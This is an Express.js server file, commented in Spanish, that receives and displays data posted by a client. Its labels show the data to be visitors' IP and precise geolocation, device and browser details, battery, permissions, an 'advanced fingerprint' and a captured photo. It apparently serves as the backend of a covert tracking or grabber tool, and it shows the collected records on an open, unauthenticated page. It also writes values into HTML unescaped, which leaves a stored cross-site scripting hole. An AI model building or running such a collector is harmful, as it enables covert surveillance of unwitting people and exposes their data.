const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

let datosRecibidos = [];

// Ruta para recibir datos
app.post('/datos', (req, res) => {
    const data = req.body;
    datosRecibidos.push(data);
    console.log('📩 Nuevo dato recibido:', data);
    res.json({ mensaje: '✅ Dato recibido y almacenado' });
});

// Ruta para ver datos (con interfaz mejorada)
app.get('/ver-datos', (req, res) => {
    // Función para formatear texto
    function formatLabel(text) {
        const labels = {
            'basicInfo': 'Información Básica',
            'geoInfo': 'Geolocalización (IP)',
            'preciseGeoInfo': 'Ubicación Precisa',
            'browserInfo': 'Navegador',
            'deviceInfo': 'Dispositivo',
            'connectionInfo': 'Conexión',
            'batteryInfo': 'Batería',
            'hardwareInfo': 'Hardware',
            'advancedFingerprint': 'Huella Digital Avanzada',
            'storageInfo': 'Almacenamiento',
            'permissionsInfo': 'Permisos',
            'photo': 'Foto Capturada'
        };
        return labels[text] || text;
    }

    // Generar HTML
    let html = `
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📊 Datos Recibidos</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f7f9fc;
            color: #2c3e50;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #2980b9;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #7f8c8d;
            margin-bottom: 30px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        .entry {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            padding: 20px;
            margin-bottom: 20px;
            transition: transform 0.2s;
        }
        .entry:hover {
            transform: translateY(-2px);
        }
        .entry-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        .entry-date {
            font-size: 0.9rem;
            color: #7f8c8d;
        }
        .section {
            margin-bottom: 15px;
        }
        .section-title {
            font-weight: bold;
            color: #3498db;
            font-size: 1.1rem;
            margin-bottom: 8px;
        }
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 8px;
        }
        .info-item {
            font-size: 0.95rem;
            word-break: break-word;
        }
        .info-item strong {
            color: #555;
        }
        .photo-container {
            margin-top: 10px;
        }
        .photo-container img {
            max-width: 100%;
            max-height: 300px;
            border-radius: 8px;
            border: 1px solid #ddd;
        }
        .empty {
            text-align: center;
            color: #95a5a6;
            font-style: italic;
            padding: 40px;
        }
        footer {
            text-align: center;
            margin-top: 30px;
            color: #95a5a6;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📄 Datos Recibidos</h1>
        <p class="subtitle">Se han recibido ${datosRecibidos.length} entradas.</p>
`;

    if (datosRecibidos.length === 0) {
        html += `<div class="empty">No hay datos aún. Envía información desde el cliente.</div>`;
    } else {
        // Mostrar cada entrada
        datosRecibidos.forEach((dato, index) => {
            const timestamp = dato.timestamp ? new Date(dato.timestamp).toLocaleString() : 'Desconocido';
            html += `
            <div class="entry">
                <div class="entry-header">
                    <strong>Entrada #${index + 1}</strong>
                    <span class="entry-date">${timestamp}</span>
                </div>
            `;

            // Iterar por cada categoría (ej: basicInfo, geoInfo, etc.)
            for (const [category, dataObj] of Object.entries(dato)) {
                if (category === 'timestamp') continue; // Ya se mostró arriba
                if (!dataObj || typeof dataObj !== 'object') continue;

                html += `
                <div class="section">
                    <div class="section-title">${formatLabel(category)}</div>
                    <div class="info-grid">
                `;

                for (const [key, value] of Object.entries(dataObj)) {
                    if (value === null || value === 'null' || value === 'No disponible') continue;
                    html += `<div class="info-item"><strong>${key}:</strong> ${value}</div>`;
                }

                html += `</div></div>`;
            }

            // Si hay foto
            if (dato.photo) {
                html += `
                <div class="section">
                    <div class="section-title">${formatLabel('photo')}</div>
                    <div class="photo-container">
                        <img src="${dato.photo}" alt="Foto capturada">
                    </div>
                </div>
                `;
            }

            html += `</div>`; // Cierre de .entry
        });
    }

    html += `
        <footer>
            🔍 Visualizador de datos | Proyecto personal de experimentación
        </footer>
    </div>
</body>
</html>
`;

    res.send(html);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en el puerto ${PORT}`);
});
